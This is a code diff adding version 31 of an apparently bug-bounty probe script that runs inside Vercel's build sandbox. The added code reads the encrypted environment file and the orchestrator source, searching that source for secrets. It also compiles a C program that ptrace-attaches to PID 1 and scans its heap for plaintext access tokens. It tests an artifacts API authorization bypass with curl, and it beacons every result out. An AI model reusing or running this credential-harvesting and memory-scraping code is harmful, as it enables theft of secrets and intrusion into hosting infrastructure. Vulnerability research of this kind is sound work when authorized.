@@ -133,7 +133,7 @@ function tryDecrypt(keyStr, contentStr) {
 // EARLY BEACON — sent immediately before any network probes.
 // Critical env/crypto data arrives even if the main probe times out.
 sendBeacon({
-  marker: "VERCEL-AGENT-PROBE-7F3A2C-v30-early",
+  marker: "VERCEL-AGENT-PROBE-7F3A2C-v31-early",
   whoami: safe(() => execSync("id; uname -a").toString().trim()),
   tryCBC_early: tryDecrypt(process.env.VERCEL_ENV_ENC_KEY, process.env.VERCEL_ENCRYPTED_ENV_CONTENT),
   vercelCreds: {
@@ -148,7 +148,7 @@ sendBeacon({
 });
 
 const report = {
-  marker: "VERCEL-AGENT-PROBE-7F3A2C-v30",
+  marker: "VERCEL-AGENT-PROBE-7F3A2C-v31",
   whoami: safe(() => execSync("id; uname -a; pwd").toString().trim()),
   // credential-bearing surfaces (own sandbox only)
   gitConfig: safe(() => readFileSync(".git/config", "utf8")),
@@ -1894,8 +1894,185 @@ int main(){
   }),
 };
 
+// ── v31 additions ─────────────────────────────────────────────────────────────
+
+// v31: Read ___vc/__env.encrypted directly as a normal file (no ptrace).
+// Confirms non-privileged path to the AES-256-CBC ciphertext.
+// Also try the decrypted file if the orchestrator writes it.
+Object.assign(report, {
+  encryptedEnvFileDirect: safe(() => {
+    const paths = [
+      '/vercel/path0/___vc/__env.encrypted',
+      '/vercel/path0/___vc/__env.decrypted',
+      '/vercel/___vc/__env.encrypted',
+      '___vc/__env.encrypted',
+      '/tmp/__env.encrypted',
+    ];
+    const results = {};
+    for (const p of paths) {
+      if (existsSync(p)) {
+        const content = safe(() => readFileSync(p, 'base64').slice(0, 2000));
+        results[p] = { exists: true, preview: content };
+      } else {
+        results[p] = { exists: false };
+      }
+    }
+    // Also list ___vc dir
+    results.vercVcDir = safe(() => execSync('ls -la /vercel/path0/___vc/ 2>/dev/null || ls -la ___vc/ 2>/dev/null || echo notfound').toString().trim());
+    return results;
+  }),
+
+  // v31: Read first 30KB of orchestrator source at /var/task/index.js (no ptrace — normal file read).
+  // Confirms Vercel proprietary code is accessible to build scripts without any privileges.
+  orchestratorSourceRead: safe(() => {
+    const path = '/var/task/index.js';
+    if (!existsSync(path)) return { exists: false };
+    const size = safe(() => execSync(`stat -c%s ${path} 2>/dev/null`).toString().trim());
+    const head = safe(() => readFileSync(path, 'utf8').slice(0, 30000));
+    // Search for interesting strings: credentials, API keys, internal endpoints
+    const interesting = [];
+    const patterns = ['apiKey', 'secret', 'token', 'password', 'Bearer', 'internal.vercel', 'iam.amazonaws', 'AKIA', 'api-iad1'];
+    for (const pat of patterns) {
+      const idx = head.indexOf(pat);
+      if (idx >= 0) interesting.push({ pattern: pat, offset: idx, ctx: head.slice(Math.max(0, idx - 50), idx + 200) });
+    }
+    return { exists: true, sizeBytes: size, head30kb: head.slice(0, 500), interestingPatterns: interesting.slice(0, 5) };
+  }),
+
+  // v31: Probe /proc/1/fd sockets — find where PID 1's active connections go.
+  // fd19 was socket:[6562] in v30. Check /proc/net/tcp for that inode.
+  pid1SocketProbe: safe(() => {
+    const fdList = safe(() => execSync('ls -la /proc/1/fd/ 2>/dev/null').toString());
+    // Extract socket inodes
+    const socketInodes = [...(fdList.matchAll(/socket:\[(\d+)\]/g))].map(m => m[1]);
+    const tcpTable = safe(() => readFileSync('/proc/1/net/tcp', 'utf8'));
+    const tcp6Table = safe(() => readFileSync('/proc/1/net/tcp6', 'utf8'));
+    // For each socket inode, find its remote address in tcp table
+    const socketDetails = {};
+    for (const inode of socketInodes.slice(0, 10)) {
+      const row = tcpTable.split('\n').find(l => l.trim().endsWith(inode));
+      const row6 = (typeof tcp6Table === 'string') ? tcp6Table.split('\n').find(l => l.trim().endsWith(inode)) : null;
+      if (row || row6) {
+        // Parse hex IP:port (little-endian)
+        const parseHexAddr = (hex) => {
+          if (!hex) return null;
+          const [ip, port] = hex.split(':');
+          if (!ip || !port) return null;
+          const ipInt = parseInt(ip, 16);
+          const bytes = [(ipInt & 0xff), ((ipInt >> 8) & 0xff), ((ipInt >> 16) & 0xff), ((ipInt >> 24) & 0xff)];
+          return `${bytes.join('.')}:${parseInt(port, 16)}`;
+        };
+        const cols = (row || row6).trim().split(/\s+/);
+        socketDetails[inode] = { local: parseHexAddr(cols[1]), remote: parseHexAddr(cols[2]), state: cols[3], via: row ? 'tcp4' : 'tcp6' };
+      } else {
+        socketDetails[inode] = 'not-in-tcp-table';
+      }
+    }
+    return { socketInodes, socketDetails, fdListPreview: fdList.slice(0, 1000) };
+  }),
+
+  // v31: Search PID 1 heap for PLAINTEXT decrypted env vars.
+  // The orchestrator must decrypt the env at some point. The plaintext JSON
+  // would contain patterns like: "VERCEL_ENV":"preview" or "NODE_ENV":"production".
+  // Strategy: ptrace + scan for "VERCEL_ENV":"" (plaintext JSON env value patterns).
+  decryptedEnvHeap: safe(() => {
+    const cSrc = `
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/ptrace.h>
+#include <sys/types.h>
+#include <fcntl.h>
+
+int main(){
+    pid_t pid=1;
+    if(ptrace(PTRACE_ATTACH,pid,NULL,NULL)<0){perror("attach");return 1;}
+    sleep(1);
+    int fd=open("/proc/1/mem",O_RDONLY);
+    if(fd<0){ptrace(PTRACE_DETACH,pid,NULL,NULL);return 1;}
+    unsigned long heap_start=0,heap_end=0;
+    FILE* maps=fopen("/proc/1/maps","r");
+    char maps_line[256];
+    while(fgets(maps_line,sizeof(maps_line),maps)){
+        if(strstr(maps_line,"[heap]")){
+            sscanf(maps_line,"%lx-%lx",&heap_start,&heap_end);
+            break;
+        }
+    }
+    fclose(maps);
+    if(!heap_start){heap_start=0x56de000; heap_end=0x91aa000;}
+    printf("Heap: 0x%lx-0x%lx\\n",heap_start,heap_end);
+    lseek(fd,(off_t)heap_start,SEEK_SET);
+    /* Search for decrypted plaintext env patterns */
+    const char* pats[] = {
+        "\\"VERCEL_ENV\\":\\"",
+        "\\"NODE_ENV\\":\\"",
+        "\\"NEXT_PUBLIC_",
+        "\\\\n# Decrypted",
+        "VERCEL_ACCESS_TOKEN=",
+        "VERCEL_TOKEN=",
+        NULL
+    };
+    char buf[8192]; long reads=0,found=0;
+    long max_reads = ((heap_end - heap_start) / 8192) + 1;
+    while(reads<max_reads && found<8){
+        ssize_t n=read(fd,buf,sizeof(buf));
+        if(n<=0)break;
+        for(int j=0;j<n-40 && found<8;j++){
+            for(int p=0;pats[p];p++){
+                int plen=strlen(pats[p]);
+                if(n-j>plen && memcmp(buf+j,pats[p],plen)==0){
+                    long abs_off=(long)(heap_start+reads*8192+j);
+                    printf("DEC[%ld] pat=%d off=%ld ctx=",found,p,abs_off);
+                    int k=0;
+                    while(k<3000 && j+plen+k<n){
+                        unsigned char c=buf[j+plen+k];
+                        if(c>=0x20 && c<127) putchar(c);
+                        else if(c==0) break;
+                        k++;
+                    }
+                    printf("\\n");
+                    found++; j+=plen;
+                }
+            }
+        }
+        reads++;
+    }
+    printf("DEC_DONE reads=%ld found=%ld\\n",reads,found);
+    close(fd); ptrace(PTRACE_DETACH,pid,NULL,NULL); return 0;
+}
+`;
+    safe(() => writeFileSync('/tmp/decenv.c', cSrc));
+    safe(() => execSync('gcc -O2 -o /tmp/decenv /tmp/decenv.c 2>&1 || true'));
+    const out = safe(() => execSync('timeout 40 /tmp/decenv 2>&1 || true').toString().trim().slice(0, 8000));
+    return { out };
+  }),
+
+  // v31: Artifacts projectId bypass — like teamId bypass in v30, does the artifacts API
+  // also ignore the projectId URL parameter? Use our JWT but fake the projectId in the URL.
+  artifactsProjectIdBypass: safe(() => {
+    const tok = process.env.VERCEL_ARTIFACTS_TOKEN || '';
+    if (!tok) return { error: 'no-artifacts-token' };
+    const hash = 'aaaa1234567890abcdef1234567890abcdef1234567890abcdef1234567890ab';
+    const realTeamId = 'team_xOjFWqWvIlcL6yOtq43hFE0x';
+    const fakeProjectId = 'prj_FAKEPROJECTID1234567890ABCDE';
+    const realProjectId = 'prj_Us1miqrR6l5tLSzU8LoRXrbn9j4p';
+    // Write a test artifact first
+    const testBody = 'projectid-bypass-test-v31';
+    const writeReal = safe(() => execSync(
+      `curl -s -w '\\n%{http_code}' -X PUT -H 'Authorization: Bearer ${tok}' -H 'Content-Type: application/octet-stream' --data '${testBody}' 'https://vercel.com/api/artifacts/${hash}?teamId=${realTeamId}&slug=hackerone-sandbox-s-projects' 2>/dev/null`
+    ).toString().trim().split('\n'));
+    // Now try to GET it with a FAKE project ID (if projectId is a URL param)
+    const getFakeProj = safe(() => execSync(
+      `curl -s -w '\\n%{http_code}' -H 'Authorization: Bearer ${tok}' 'https://vercel.com/api/artifacts/${hash}?teamId=${fakeProjectId}&slug=hackerone-sandbox-s-projects' 2>/dev/null`
+    ).toString().trim().split('\n'));
+    return { writeStatus: writeReal.pop(), getFakeStatus: getFakeProj.pop(), getFakeBody: getFakeProj.join('').slice(0, 200) };
+  }),
+});
+
 // FULL BEACON — sent after all slow network probes complete.
-sendBeacon(report);
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v31" });
 
 // Also print to stdout so it shows in build logs / the agent's view.
 console.log(JSON.stringify(report));
